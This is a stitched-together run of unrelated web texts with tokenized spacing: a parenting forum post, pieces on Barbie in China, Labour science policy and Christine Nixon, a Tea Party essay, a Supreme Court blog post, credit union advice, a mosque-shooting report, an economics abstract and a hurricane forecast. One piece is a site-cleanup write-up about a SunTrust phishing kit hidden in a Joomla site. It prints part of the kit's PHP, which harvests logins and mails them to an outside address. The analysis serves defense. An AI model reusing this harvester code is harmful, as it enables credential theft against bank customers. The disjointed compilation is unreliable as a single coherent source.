I am more intererested in my son feeling he can come to us with sexual questions than feeling he has to HIDE everything from us .
Maybe we are more OPEN than most , I do n't doubt this .
MY oldest thought what his dad did was really funny .
And again , he has turned out just fine , functionally normal male , and still wants to wait till marraige to even have sex .
He is VERY open with us and I feel I did something right to have him come to this place mentally and freely with us as parents .
Just be careful to not completely destroy the diaglog between you and your daughter with this subject , she will always remember what just happend and how you re-acted and how terribly deeply shamed she felt in your presence .
Trust me when I say she already FEELS shame , but is still curious .
The last thing you want is her feeling this way for normal curiosity and making it a habit to hide all she is feeling from YOU because she felt so terribly & utterly shamed when you found out .
Just another perspective .
Maybe we are TOO open with our kids , they are aware Mom & dad enjoys sex , and we have lots of books on the subject in our bedroom .
Maybe
We need more balance .
This could be true , but sometimes we go TOO overboard in protecting them also .
***** Ironically I just had an hour long sex talk with this younger son , he came in the room while I was writing this , so thought now is a good time .
It went very well , not too awkward , he said it was easier than he thought - talking to me , his mother .
He asked me questions , he was honest , he even showed me some things on the net , how he struggles with this , how HE FEELS shame for looking , but that it IS good that we did not add to his shame .
He wants something on the laptop to stop him from doing this .
He wants to do the right thing .
He did laugh about what we did , he was not sure Dad did that to his desktop that day , but it did freak him out .
I think it was important that we CAN laugh a little about this .
It is all about the learning , now we need to get down to business and start blocking .
Downloaded K - 9 Web Protection the next day , this is free and works well , except it blocks too much , even YouTube , I unblocked that for him , we all enjoy You Tube around here for music .
Thanks for listening .
Modern day national influence , some smart people like to argue , spreads through the “ soft power ” of brand appeal and attraction rather than the “ hard power ” of coercion .
In China , one avatar of U.S. soft power tends to be trim and busty , and come with blue eyes and a long mane of blonde hair .
Her name is Barbie , she is made of plastic , she was born in Malibu and Chinese girls want to be like her .
Barbie comes in all sorts of versions , according to the man who introduces her to her foreign friends , Mattel ’s international president , Bryan Stockton .
Still , in China , the No. 1 - selling Barbie doll is the sunny surfer girl who cruised across the Pacific from southern California to bring millions of young Chinese girls a new vision of the world , not to mention themselves .
“ The challenge ( in China ) is to have toys become a part of the culture , ” Stockton said at the Reuters Consumer and Retail Summit on Monday .
“ We ’re trying to get our toys to be a part of a child ’s development . …
In Chinese culture it ’s very important to help girls think they can aspire to be something .
…
Barbie is a western icon and she ’s an American icon , and Barbie is from Malibu , California . ”
“ Now , ” Stockton said , “ Barbie is a part of Chinese educational culture and Chinese pop culture . ”
It ’s important to remember , however , that it ’s not about seeing yourself in Barbie ’s physical manifestation here on earth .
As Stockton said :
“ In reality , Barbie is a toy .
Barbie is for aspiration .
…
Barbie does n’t represent anything concrete .
Barbie is a plastic doll , so what we try to concentrate on is all the things Barbie provides for girls …
She ’s a great thing for girls .
She ’s done a lot of wonderful things for girls , and so we ’re going to continue to emphasize the positive . ”
Wish they all could be California girls ?
Wish no longer .

We all remember John Prescott dancing – well , wobbling – to D : Ream 's election anthem Things Can Only Get Better as Labour was swept into power in 1997 .
Thirteen years later the band 's keyboard player , Brian Cox , has become a professor of physics and passionate science activist , and leads a small army of scientists and science advocates who are fed up with the party after a series of very public rows about things such as drug policy and science funding .
Has Labour learned from its mistakes ?
As with the Conservatives , Labour 's manifesto places great emphasis on linking science with business , and indeed its responses to our questions came from business minister Pat McFadden , rather than science minister Lord Drayson .
One promised initiative would seek to increase the supply of science and technology graduates , creating what Labour calls a " technician class " providing employees for hi-tech industry .
In terms of its broad approach to the position of science in society , it 's difficult to find air between Labour and the Tories .
Brian Cox : Science funding
Do you plan to maintain Britain 's science budget below the European average ?
Two questionable statements are made in Labour 's response to our question .
First , the suggestion that the debate is no longer about saving British science is an arrogant one that dismisses serious concerns in the research community .
Second , the assertion that " investment in science and research " has doubled in real terms is highly dependent on what figures you include , and ignores the fact that spending as a proportion of GDP has remained static .
Research continues to be something that is paid for out of the Treasury 's loose change .
Past record aside , Labour 's pledges are as vague as those of the other parties , with no manifesto commitment to preserve the science budget .
Science funding will be ring - fenced , but we do n't know how big the enclosure will be .
Alternative medicine
If the balance of evidence suggests that a treatment does not perform any better than placebo , should it be supported by the NHS ?
The Department of Health has yet to give its response to the Science and Technology Select Committee 's damning report on homeopathy , but under a Labour government its views would apparently be irrelevant .
Labour states that it would not take a line on alternative medicine , but would rather leave the decision to local trusts .
A revealing comment is that " the availability of suitably qualified / regulated practitioners " would be taken into account in decisions on the provision of treatments .
Labour has been active in promoting the creation of alternative medicine quangos in the past few years , which means it is helping to give credibility to quacks and increasing their chances of infiltrating our health services .
The fact that hundreds of thousands of pounds of public money have been poured into alt med lobby groups like Prince Charles ' Foundation for Integrated Health – now defunct after being involved in fraud and under investigation by the Charity Commission – raises serious questions about ministers ' judgement .
Simon Singh : Libel
What will your party do to reduce the chilling effect of our libel laws on science ?
Nothing controversial here , with Labour part of the cross -party consensus on libel reform .
We owe a huge debt of gratitude to the British Chiropractic Association for its generous sacrifice in making reform of our libel laws possible .
Climate change / Energy
Should nuclear power be part of our country 's strategy for reducing greenhouse gas emissions ?
How soon can we bring new plants online ?
In contrast to all the other parties , Labour provides very specific and credible plans for energy , although of course it has greater access to the necessary information .
Increased nuclear capacity would begin to come online by 2018 ( although the cost of this is not mentioned ) , with a target for 15 % of energy to come from renewables by 2020 , including plans to construct up to 6,400 new offshore wind turbines .
Labour also demonstrates an understanding of the economic rewards to be reaped from turning Britain into a world - leading centre for green technology , with a particular emphasis on marine and tidal energy .
David Nutt : Drug policy
To what extent should drug policy be based on scientific evidence ?
What evidence , if any , would you require to declassify a drug ?
" It is for government to consider that advice and then to make policy decisions taking into account all relevant factors . "
In saying this , Labour demonstrates that it has not understood the criticism it received after Nutt - gate , and positions itself firmly alongside the Conservatives in believing that no amount of evidence can ever trump political ideology .
What makes this an even more bitter pill to swallow for many on the left is that Labour 's political ideology in this area appears to be the same social conservatism as that of the Tory party .
Animal testing
Is animal testing necessary ?
Are the ethical concerns outweighed by the benefits ?
How would you like to see regulations on animal testing change under your government , if at all ?
As with the other major parties , Labour supports animal testing and understands its necessity , correctly pointing out that " no validated and established laboratory methods are available to totally replace animal experimentation . "
It is also worth mentioning Labour 's decent record in this area , with a ban on the testing of cosmetics on animals , and the protection of great apes .
Petra Boynton : Public health
How will your party ensure public health / education campaigns are underpinned by evidence , and how will you evaluate their success ?
Labour is good at making the right noises on public health campaigns :
" We have put in place tough performance targets in key areas like childhood obesity and the success of interventions is monitored closely .
We also track performance in areas like smoking cessation . "
The problem is that targets and performance measures are n't necessarily the same as properly controlled trials of the sort that the Lib Dems and Conservatives propose , and it's hard for independent researchers to evaluate their success if methodology and data are not openly published .
While the other main parties are looking at policy improvements in this area , Labour seems happy to continue with the status quo , which is disappointing .
Ben Goldacre : Pharmaceutical regulation
Do you believe pharmaceutical companies should be forced to publish all the research data they have on the potential benefits and harms of drugs they manufacture ?
" A Labour government will always keep an open mind on the publication of data from this sector where there is strong public interest , but we have no immediate plans to force this type of disclosure . "
When is the disclosure of information about the efficacy of drugs not strongly in the public interest ?
A disappointing answer , once again indistinguishable from the Tory position , which gives a free pass to pharmaceutical companies .
Conclusions
On the positive side , we have reasonably coherent and detailed plans for tackling climate change and building up energy security over the next 10 years .
Labour also joins a broad political consensus on GM technology , stem cell research , libel reform and animal testing ; and it is no worse than the other parties when it comes to the future of science funding .
The problems are many , and can be clumped into two broad groups .
The first group includes science funding , drug policy and pharmaceutical regulation , where Labour 's approach seems virtually indistinguishable from Conservative policy .
In fact it 's notable that if you take many of Labour 's answers , you would be hard - pressed to tell which party they came from .
It takes a remarkably pro-business line , which manifests itself in a refusal to put proper scrutiny on pharmaceutical companies , and an attitude that seems to regard science as almost a subset of business .
Meanwhile on drugs , we are faced with another potential government that believes the ignorant views of Daily Mail columnists should be considered on a level with expert scientific advice .
Then we have the disappointment of Labour 's policies on public health and alternative medicine , which both seem to be " carry on as before " in spite of voluminous evidence and criticism suggesting that this is not a sensible approach .
The problem with Labour is n't its previous record on science .
We all make bad decisions , and so do governments , but the measure of a good government should be its ability to learn from its mistakes , and improve policy accordingly .
The problem is , quite simply , that it has n't .
And so , for many , science has become yet another reason to desert Labour .
Best candidate
Andrew Lomas , candidate for Wycombe , is tackling a PhD in cancer biology and drug design , but finds time to engage with science activists .
He challenged his party 's treatment of David Nutt , and described homeopathy as " a stinking pile of uselessness " .
Worst candidate
Alan Johnson .
While arguably a number of Labour MPs hold even more worrying views , his treatment of Nutt epitomised the clash between science and ideology in politics in recent years .
But he was a great tabloid editor , the most effective and terrifying boss I ever had .
No one in his conferences had any doubt about what our goal was , and that energy was transmitted down the line to every reporter and editor .
As a result , the quality of reporting and writing improved exponentially .
Of course , we worked in the Murdoch empire which was refreshingly free of useless bureaucracy in the 1990s , because Rupert Murdoch himself scorned it .
I make this point in trying to fathom the catastrophic failures of leadership we keep seeing lately - from the billions wasted on pink batts and school hall rorts , to the 173 deaths in the Victorian bushfires last year .
Even more unfathomable is that no one seems accountable .
Failed leaders can't explain what went wrong and are showered with sympathy .
We seem destined never to learn from our mistakes .
When the former Victorian police commissioner , Christine Nixon , 56 , admitted in the bushfire royal commission this month that she was getting her hair cut , meeting with her biographer and having dinner at a restaurant with friends on Black Saturday last year , she was enveloped in a warm group hug .
A few troglodytes , such as the former premier Jeff Kennett and the Liberal MP Fran Bailey , said she should be punished for dereliction of duty , and sacked from her $ 8000 - a- week position as chairwoman of the Bushfire Reconstruction and Recovery Authority .
But they were quickly drowned out by Nixon supporters , such as Heather Ridout and Joan Kirner , who claimed the criticism was a sexist plot .
The sisterhood enveloped her .
After being forensically eviscerated by counsel assisting the commission , Rachel Doyle , SC , Nixon appeared unperturbed , saying she had been buoyed by the support from Black Saturday families .
We seem to be impressed by leaders skilled at looking confident and brazen through catastrophe , as incredible amounts of money are wasted , their core business disintegrates and , sometimes , people die .
What was most telling about Nixon 's testimony to the royal commission were the mundane details of her performance that day and how she perceived her role .
She was the No.1 person in the state with operational responsibility , yet she did n't know what to do .
When she dropped into the State Emergency Response Co-ordination Centre about 3 pm on Black Saturday , February 7 , after meeting in her office with her biographer , she seemed to just float around , lost , not asking for a briefing , observing that people seemed '' very busy ' ' .
'' I thought the people in those areas were carrying out their responsibilities effectively , the best I could tell , and that they were very busy trying to respond to a range of issues . ''
But , asked Doyle , '' What were they busy doing ? ''
Good question .
As for her role , '' I would look at computer screens over people 's shoulders .
'' And what , '' asked Doyle , '' what did you glean by looking at … screens over people 's shoulders ? '' '' I just saw that they were very busy , that people were working on a range of issues … and that people were going about their work . ''
'' It sounds rather passive , Ms Nixon . ''
So it does .
What the people in that control room were n't doing , for example , was warning towns in the path of the fires that they were next in line .
Asked if she had '' considered ' ' whether the towns might have been warned , Nixon said she ' ' assumed ' ' they had .
The paralysis in the co-ordination centre on Black Saturday , as revealed in the commission testimony , is a textbook demonstration of what managerialism or bureaumania does to organisations .
It causes everyone to lose sight of their core aim , which is to run an emergency response system that warns people a fire is on its way , or a police force that protects good people from bad people , or a land management system that does n't allow fuel to build up to lethal levels in the bush .
As police commissioner Nixon became the posterchild for bloated bureaucracies everywhere .
And the media adored her .
She was progressive !
She took part in the gay and lesbian pride march !
She was a woman !
She was consultative !
She relaxed uniform standards !
She recruited women and minorities !
She answered emails , had lots of meetings and set up myriad committees .
She was the nana feminist , who humbled the most masculine , testosterone charged militaristic symbol of the patriarchy itself .
She was perfectly chosen and trained to spend her days being busy doing her job , whatever that was .
Busy , busy , busy .
The truth is her defenders are right , she can hardly be blamed .
Christine Nixon is the perfect leader for our age .
Federal Government Provides Entitlements at the Cost of Collapse
The year 2010 has America reeling on the brink of total , disgusting , annihilation , whether the D.C. Gang admits it or not .
Look at us .
We have debts , currently at close to $ 13 trillion , and committed spending of $ 170 trillion , both amounts far too large to comprehend .
We have borrowed and borrowed from the citizens , China , and anyone else who will lend .
The more we borrow , the more we owe , and the more interest which will accumulate .
The lenders are now having second thoughts about lending us more .
Without the loans , we are lost , and may be lost eventually anyway .
It used to be that the income tax paid for our expenses , but now it does n’t even pay the interest we owe each year .
We cannot ever pay the debt , which grows larger each minute .
We have managed to create enemies around the world by interfering in others ’ business , lifestyles , and politics , especially in Muslim nations .
Why are we in Afghanistan , and Iraq ?
Why are we responsible for millions of innocents being put to death in Iraq , Afghanistan , Vietnam , and Korea ?
Did any of these nations harm or threaten us ?
It goes back to economics again , because those wars have reduced the value of our dollar so much , that it will buy but perhaps 10 % of what it bought before Korea .
The devaluation of the dollar has made saving in it stupid , but most still do .
We have decapitated cities , jobs and manufacturing gone overseas , and a huge underclass .
How did it happen ?
Several things happened , and not just when FDR came into office .
They all have been committed by …the federal government .
Every single problem or situation we have now , in this once land of the free and home of the brave , was instigated by the federal government and the Congress and Presidency which operates it .
The concept of public schools , and for that matter ‘ public ’ anything , is certain to lead to corruption , inefficiency , huge costs , and little accomplished .
Would you rather use a private bathroom , or a public rest room ?
The concept of public schools , arose from the usual reasons , which politicians always use , and that is ‘ for the public good . ’
‘ Everyone should have an education !’
Everyone should be rich too , and have a car , nice home , ample food , vacations , free air travel , and admission to movies and amusement parks also .
But everyone is n’t going to get those things , at least for now , so why should government make taxpayers pay for and force attendance to a public school ?
Public schools are a disaster , simply because they are ‘ public , ’ and everyone thinks they are ‘ free . ’
Before public schools , America was infinitely better educated than it is now .
Check out a McGuffy ’s Reader of 125 years ago , and see for yourself .
Voting used to require people to be able to pass a literacy test and pay a small poll tax before they were allowed to vote .
This sifted out those who were unable to make a good decision , or even know what they were voting for , and the poll tax paid for the cost of the election .
When the voter rights act was passed , do - gooder liberals invaded poor sections of America .
As a result , we had , and have even more now , inept voters , who always vote for the Democrat who promises the most largess from the public treasury .
This takes us back to economics again , and a huge debt .
America has a crop of politicians in office , who are an absolute disgrace , because of the overwhelming number of inept , low IQ , un-educated , voters .
What is wrong with a voter being able to know what ’s going on , and to have to pay a dollar or so to be able to vote ?
As an addition , why not require a voter to prove he has a job , or even own property ?
When FDR and his Democrats passed Social Security , which has naturally become a habit - forming nightmare , Americans forgot how to prepare for the future , and Social Security will be with us forever .
Its cost will escalate infinitely , and is already bankrupt , with not a single dime in the till .
A nightmare conceived by politicians , because everyone ‘ needs to have a good retirement , ’ which is the same as saying , “ everyone needs an education . ”
The result of both is a disaster .
What everyone ‘ needs , ’ and what our Constitution says government should do , are opposites .
People should have to work for what they “ need , ” and not have it given to them , because it destroys the mind and incentive when they are given what politicos have told them they “ need . ”
For every freebie or subsidy , the deficit grows larger , and collapse grows nearer , which will bring on violence .
Try to get out of the big cities before the inevitable happens .
The public school idea , has proven to be a disaster of titanic proportions , but no one knows how to stop it or tame it .
It ’s that way with all supposedly important and needy things , such as food and health care , to name two more examples .
When Medicare was passed in 1965 , because ‘ everyone needs to have good health , ’ the camel got its foot in the tent , and now he is in the tent , and the medical system will go down the tubes .
Medicare , was simply the first step towards what Obama , Democrats , and probably too many RINO Republicans want , and that is what Canada , the UK , and other socialistic nations have , and that is total government medical care .
This will mean that America will no longer be the primary discoverer of new drugs , and have the world ’s best hospitals and doctors .
We ’ll just be another cog oin the big wheel of socialism , communism , and totalitarianism , or total government .
When the first public housing was built in 1937 , because “ people need to have a place to live , ” that spelled the ruin of our cities , caused white flight , huge oil consumption for commuting , expensive , taxpayer paid for highways , air pollution , frayed nerves , billions of hours wasted in travel time , and lost tax base in the cities .
There will always be public housing now , because no one could possibly do away with it .
Those people vote for their Democrat representatives and senators .
When food stamps were started in 1972 , because ‘ poor people need to eat , ’ another cog in the communistic wheel of total government was cast , and it will never go away .
I have n’t even mentioned the income tax and Federal Reserve , which was sneaked into law in 1913 .
( The word “ snuck ” is terrible grammar , and far too many use it ! ) .
The Federal Reserve , which is not ‘ federal , ’ and has no ‘ reserves , ’ caused the great depression , as well as the one we are currently in , but no one in D.C. has the guts to look at the fed , and realize that it has helped to kill America .
The 16th Amendment ( income tax ) was not legally ratified , but the Supremes say it was , even though absolute proof exists that its ratification was totally unconstitutional .
Two volumes in my possession , titled , “ The Law That Never Was , ” volumes one and two , give every state ’s vote , and every single detail of that state ’s vote for the 16th Amendment , and this unequivocally proves that it was never constitutionally passed .
So we continue to pay , and probably always will .
No one in D.C. has the guts to stand up and say ‘ ENOUGH . ”
If all these things were immediately stopped dead in their tracks , we would have mass rioting , which we might have anyway , when the debt problem causes a dollar melt - down .
There may be ways to correct it still , if the Tea Party Movement gets really into gear .
Here ’s how it could happen if the right politicians got into office .
(1) Prohibit any new entries into Social Security , but allow those in it already to continue .
Give a refund of all that was put in , for citizens under the age of 30 .
That would rid us of it in 32 years .
(2) Prohibit any new entries into Medicare , and refund all that those under 30 have put in , plus abort the new Obamacare law .
(3) Eliminate all federal subsidies for public schools , public housing , and public anything .
Let the states decide what to do , and what to tax .
(4) Gradually eliminate 90 % of federal bureaucracies , beginning with immediate removal of the Department of Education .
Want a shocker ?
Google “ Federal bureaucracies and agencies , ” and you ’ll be amazed at the nonsense that goes on in D.C .
(5) Eliminate all federal mandates to states , counties and cities .
These cost taxpayers lots of dollars , and are throttling their legitimate functions .
(6) Naturally , bring all the troops home , and declare total neutrality , which might bring a semblance of sanity to D.C .
( 7 to 100 ) you name it !
We are at a time in history , when it might be possible to save America from the natural progression of things throughout the history of all nations and civilizations , which seem to have had a lifespan of about 200 years .
We ’re way past that .
It will be difficult , seeing the low quality of voters who always vote for the Democrat who promises them the most .
We got the low quality because of the above .
To win , the thinkers and logical , patriotic citizens , must out - vote those who are hooked on handouts , Medicare , Social Security , food stamps , public schools , and public housing .
It will not be an easy job !
There is so much wrong here , all caused by ever growing government .
Mistakenly , people look to government to fix things , but government not only makes things worse , but creates ever more destructive laws , bureaucracies , and mandates , which have destroyed America .
Ten years ago , would any American have thought we ’d have a couple dozen “ Czars ? ” Chin up , protect yourself , and go to one of 2,000 Tea Parties today !

A Caveat , Walter Dellinger
“ In Skilling ( ably explained by Paul ’s posting ) , my law firm colleagues pressed the argument that the statutory crime of denying anyone of the “ intangible right of honest services ” was unconstitutionally vague unless it was sharply limited to bribery and kickbacks .
Given that the honest - services statute had been the basis of hundreds of prosecutions that had been upheld in every federal court of appeals , it may have seemed an unlikely gambit to challenge its constitutionality at this late date .
The fact that all nine justices agreed that this long - standing and frequently invoked law was unconstitutionally vague suggests once again that litigants should not take law “ settled ” by court of appeals as a given . ”
— Walter Dellinger , * writing in Slate
Well , no , with due respect to Walter Dellinger — and a great deal of respect is due here ; this post and his others thus far are outstanding in their analysis not just of the narrow substantive issue that the Court decided in the cases he ’s discussing , but also in their underlying indications — the fact that all nine justices agreed that this long - standing and frequently invoked law was unconstitutionally vague suggests once again that litigants who fall within one of the privileged classes of parties whose petitions to the Court will be given actual consideration by the justices should not take law “ settled ” by court of appeals as a given . ”
The Skilling case and the related Black and Weyrauch cases decided in concert , all of them challenging as unconstitutionally vague the “ honest services ” statute , illustrate , as does another high - profile opinion the Court issued within the last two weeks , Stop the Beach Renourishment , Inc. v. Florida Dept. of Environmental Protection , that these justices will look the other way for many years ( some of the justices , for decades ) , rejecting one after another after another request that the Court consider a challenge to the constitutionality of , or a challenge to a lower federal courts ’ interpretation of , some statute or court - created procedural or jurisdictional “ doctrine ” ( e.g. , a court - created rule that determines whether the federal courts have “ subject - matter jurisdiction ” to hear the case at all ) , until some zillionaire CEO or some Fortune 100 corporation or some group or individual challenging as unconstitutional some government - caused diminishment of the value of their property or some other government action opposed by the Republican Party ’s base .
Or at least until some other private litigant has the sophistication and financial wherewithal to hire a member of the elite group of regular Supreme Court litigators .
Or until some government or government official or employee asks the Court to consider the issue .
In a remarkable admission five years ago in an opinion written by Justice Ginsburg in a case called Exxon Mobil Corp. v. Saudi Basic Industries Corp. , the Court actually conceded that a subject - matter jurisdictional doctrine known as the Rooker - Feldman doctrine , created by the Court in 1983 , had been routinely and profoundly misinterpreted by the lower federal courts for more than two decades .
That Court - created doctrine impliedly inserted a word — the word “ only ” — into a particular jurisdictional statute , 28 U. S. C. § 1257 , so that , with that word inserted , the statute removed from the lower federal courts the authority to hear cases that challenged the constitutionality of state - court procedures or interpretations of state laws and policies .
Until last week , that is .
The opinion five years ago in Exxon Mobil Corp. limited the use of the doctrine only to the extent necessary for Exxon Mobil to win .
No matter that that particular limitation on the use of the doctrine was nonsensical .
The limitation was that the lower federal courts indeed could consider such cases as long as the case was not completely over in the state courts , including in the appellate courts , at the time that the federal lawsuit was filed .
Exxon Mobil ’s case was still pending in the state courts , so — voila !
— the federal courts could ( no , make that , must ) hear Exxon Mobil ’s federal lawsuit .
That ruling enabled the lower federal courts to continue to refuse to hear such lawsuits except in cases that were still pending at some level in the state - court system .
Until this month , that is .
Actually , first , on June 1 , the Court issued a majority opinion by Justice Ginsburg in a case called Levin , Tax Commissioner of Ohio v. Commerce Energy , Inc. , holding that in the particular type of case — cases in which a party is challenging the constitutionality of a particular state tax — the party must first litigate that issue to its full conclusion in , um , state court .
The case subtlely killed Rooker - Feldman in its Exxon Mobil reincarnation .
But the opinion did n’t mention Rooker - Feldman .
Three weeks later , in Stop the Beach Renourishment , Inc. , though — much to my surprise — it did .
In an opinion by Justice Scalia , who referred derisively to Rooker - Feldman ( to his credit , not for the first time during his tenure on the Court ) as “ the so - called Rooker - Feldman doctrine ) , the Court overturned the doctrine in total .
The Scalia opinion does n’t actually say that that is what the Court was doing , opting instead to say that the doctrine is not after all a subject - matter - jurisdiction doctrine but is just a reiteration of another legal doctrine called the doctrine of res judicata .
The doctrine of res judicata is one that predates the Rooker - Feldman doctrine by roughly two hundred years .
It bars litigants from re-litigating issues or claims that they lost on in earlier litigation — but its application is unequivocally limited by four specific requirements of constitutional due process of law .
Justice Stevens , incidentally ( or maybe not incidentally ) , is a longtime , vociferous critic of Rooker - Feldman , and has advocated its demise .
Because this particular case challenged the constitutionality of what the petitioners to the Court called a “ judicial taking ” via a state court ’s ruling in their case , and because these litigants had filed their Fifth Amendment “ property takings ” challenge in the lower federal courts after the state - court case was completed , the Court needed to effectively kill the Rooker - Feldman doctrine in all its incarnations in order to hear the case .
I wrote a few months ago on Slate ’s “ The Fray ” discussion board that the Court would decide the case on the merits of the substantive constitutional issue , but I doubted that the Court would even mention Rooker - Feldman .
I expected the justices to silently treat this as a one - case instance .
So I ’m surprised .
And deeply gratified .
This is , of course , not to say that the lower federal courts will stop invoking Rooker - Feldman to dismiss lawsuits that challenge the constitutionality of state - court procedures or state - court rulings .
But it is to say that next time some CEO , mega - corporation , or group or individual challenging the constitutionality of some state - court ruling that offends the Republican base , the Court may actually finally expressly say that it is killing Rooker - Feldman .
But only if that is absolutely necessary in the particular case .

But funding really is n't decreasing .
When all federal funding is totaled , according to White House spokesperson Nick Shapiro , the city is getting $ 47 million more for port and transit security over the previous year 's budget , the last signed into law by the Bush Administration .
Remember : $ 100 million in port and transit security grants were earmarked for NYC from the American Recovery and Reinvestment Act -- the stimulus package .
With that money , the total for NYC will be $ 245 million .
" In fact , one out of every three recovery dollars for transit and port security went to NYC , making them the largest recipient in the country , " Shapiro said .
Overall port and transit security grant funding increased 14 % from the Bush to Obama administrations .

One of things that you might have heard is that credit unions offer better deals than many banks .
There are stories of better yields on deposit accounts , lower interest rates on auto loans and mortgages , and better rates on credit cards .
However , one of the issues associated with credit unions is that membership is supposed to be limited .
Credit unions , though , are enterprising enough to find ways around such restrictions .
As non-profits , they are supposed to serve specific clientele .
And that specific clientele is getting wide enough that it is possible for many different people to join – even if they do n’t live in the immediate area .
The History of Credit Unions
For some perspective on the latest developments in credit union membership requirements , it can help to have a small history lesson .
Credit unions have been around since the middle of the 19th Century .
There are some differing accounts as to whether the first credit union appeared in England in 1844 , or in 1852 in Germany .
In any case , the idea of a cooperative effort to make financial institutions more accessible to the poor and lower middle class , and to the rural , began in Europe in the mid-1800s .
Capital needs for many groups were unmet at the time , and some banded together in order to form a credit union that could help them get access to the financing needed to keep small business ventures and family farms going .
The movement spread throughout Europe , and then to the U.S.
The first credit union in the U.S. was established in New Hampshire in 1908 .
The idea caught on , and by 1934 there were enough credit unions to band together to form a national organization of credit unions .
In the U.S. , Credit unions today are granted special tax status as not - for - profit financial institutions .
( Other tax rules and regulations may apply in other countries . )
This distinction is important , since this status recognizes that credit unions do , indeed , need to turn a profit in order to better serve members .
This is the main difference between the “ not - for - profit ” status accorded credit unions and that “ non-profit ” status that we are familiar with through charitable organizations .
It is important to remember that , even though credit unions have special tax status , they do not run on donations .
They do need to make a small profit , and this is recognized .
Members of the credit union are also part owners .
They elect directors to sit on the board , and the main mission of credit unions is supposed to be to serve its members / owners , and turning a profit is supposed to be secondary .
Credit Union Membership
The main issue is who can become a member of a credit union .
Traditionally , credit unions have served small populations – another reason for the favorable tax status that credit unions enjoy .
Credit union members are supposed to share common characteristics .
Some of these characteristics can include living in a specific geographic area , belonging to the same workplace , or attending the same university .
By narrowly defining who could join a credit union , these financial institutions limit themselves , but supposedly better understand the needs of their members .
For many people , though , the membership requirements have been frustrating .
How are you to join a credit union and take advantage of the perks if you are n’t an alumnus right university , or work for the right company ?
Without a community credit union to fulfill the need , many people found themselves at a loss , until credit unions began tweaking their membership requirements .
In this digital age , when online banking is common , credit unions are hoping to branch out and reach more people .
Now it is possible for nearly anyone to join a credit union and take advantage of some of the perks associated with membership .
This is because credit unions are allowed to cater to members of the same organizations , associations or charities .
Some credit unions only require you to donate a certain amount of money to a charity , and you can join a credit union .
In some cases you may need to join a specific association – and pay the dues .
If you can save thousands , though , by getting a better interest rate on your mortgage , it ’s often worth parting with between $ 25 and $ 50 to join an organization that you might not have a true interest in .
And this is what has some banks upset .
Banks have to pay taxes that credit unions are n’t subject to and that , they assert , means that they ca n’t offers some of the same terms that are seen in credit unions .
Bankers have been trying to get regulators to enforce tighter membership requirements on credit unions – or at least rescind their special tax status .
So far , though , efforts have been largely unsuccessful .
Joining a Credit Union
While credit unions do not always offer the most for your money , they often do .
If you are interested in joining a credit union , you can look in your local area and find out what the membership criteria are , and determine whether you meet them .
In many cases , you can get information on steps you can take to become eligible for membership .
And , if you ca n’t join a local credit union , there are actually credit unions that recruit using the Internet .
You can look online to see what you need to do in order to joins a bigger credit union , even if you live on the other side of the country .
You should also keep in mind that there can be some inconveniences associated with credit union membership .
Because credit unions are not national , finding an ATM can be difficult if you live across the country from your credit union , or if you are traveling .
Make sure that your credit union is a member of a coop of credit unions .
These organizations will allow you to make ATM transactions and perform other transactions if you belong to the same organized group of credit unions , free of charge .
Make sure you understand where these coop credit unions are so that you are n’t racking up the transaction fees .
Joining a credit union is n’t the right choice for everyone , but for someone who is worried about the health of a bank , or who is interested in getting more for the money , it might be a good choice .
Once you meet the membership requirements , double check to make sure that the credit union meets your expectations of convenience and savings .

Last week we were called to fix a Joomla site that got blacklisted and had some malware on it .
Nothing unusual as we do that many times a day .
However , after some analysis of the site , we found a directory that did n’t look quite right .
That ’s what we found : / public_html/components/com_jsecure/SunTrust .
Hum … a “ SunTrust directory ?
That should n’t be there .
When we looked at the content , it had 4 files :
$ ls -la
index2.htm
index.htm
login.php
server.php
The index.htm was similar to the login page from SunTrust and asked for the user / pass of the person accessing it :
When the user submitted the form , it would load the login. php script :
$ ip = getenv( " REMOTE_ADDR " ) ;
$ message .= "------------------------------------------------------------------n " ;
$ message .= " USER ID : " .$ _POST [ 'uid ' ] . " n " ;
$ message .= " Password : " .$ _POST [' password ' ] . " n " ;

{

else

}
This script would send to peculiarhome@sify.com the user name and password of the victim .
But that ’s not it , after that , it will load the index2.htm that will ask the user for every information possible :
Once the form is completed , the server . php script would be loaded and send all that information to peculiarhome@sify.com :

TWO West Australian men alleged to belong to an extreme nationalist group have been arrested and charged with firing shots at a Perth mosque .
Three shots were fired into the dome roof of the Canning Mosque , also known as the Suleymaniye Mosque , in the southeastern suburb of Queens Park , in the early hours of Thursday , February 4 .
Today , WA police raided two houses at Kalamunda and High Wycombe in Perth 's east and a house in Bunbury in the state 's southwest .
The two accused are alleged to be members of the Perth - based extremist group Combat 18 , police said .
A 24 - year - old High Wycombe man and a 25 - year - old Greenmount man were charged with one count each of causing criminal damage , discharging a firearm across a road and possessing an unlicensed firearm .
A 19 - year - old old Kalamunda man was charged with one count of possessing an unlicensed firearm .
A police spokeswoman said extremist groups or individuals who engaged in acts such as the mosque shooting would not be tolerated .
She said all available police resources would be used to investigate and prosecute such offences .
Abstract :
Few would dispute that sovereign defaults entail significant economic costs , including , most notably , important output losses .
However , most of the evidence supporting this conventional wisdom , based on annual observations , suffers from serious measurement and identification problems .
To address these drawbacks , we examine the impact of default on growth by looking at quarterly data for emerging economies .
We find that , contrary to what is typically assumed , output contractions precede defaults .
Moreover , we find that the trough of the contraction coincides with the quarter of default , and that output starts to grow thereafter , indicating that default episode seems to mark the beginning of the economic recovery rather than a further decline .
This suggests that , whatever negative effects a default may have on output , those effects result from anticipation of a default rather than the default itself .

* NOAA sees 8 - 14 hurricanes , most since record 15 in 2005
* Says increased chance of landfall in " more active " year
* Storm surge from hurricane could bring oil slick inland
* Season will be active , but how active depends on La Nina
* Outlook helps push oil prices higher Thursday - analysts ( Updates oil price in paragraph 9 )
By Christopher Doering
WASHINGTON , May 27 ( Reuters ) - The Atlantic storm season may be the most intense since 2005 when Hurricane Katrina killed over a thousand and disrupted oil production by crashing through Gulf of Mexico energy facilities , the U.S. government 's top weather agency predicted on Thursday .
In its first forecast for the storm season that begins next Tuesday , the National Oceanic and Atmospheric Administration forecast 14 to 23 named storms , with 8 to 14 developing into hurricanes , nearly matching 2005 's record of 15 .
Three to seven of those could be major Category 3 or above hurricanes , with winds of more than 110 miles per hour ( 177 km per hour ) , the agency said , echoing earlier predictions from meteorologists that a particularly severe season could disrupt U.S. oil , gas and refinery operations .
[ ID :nN26214825 ]
" If this outlook holds true , this season could be one of the more active on record , " said Jane Lubchenco , NOAA 's administrator .
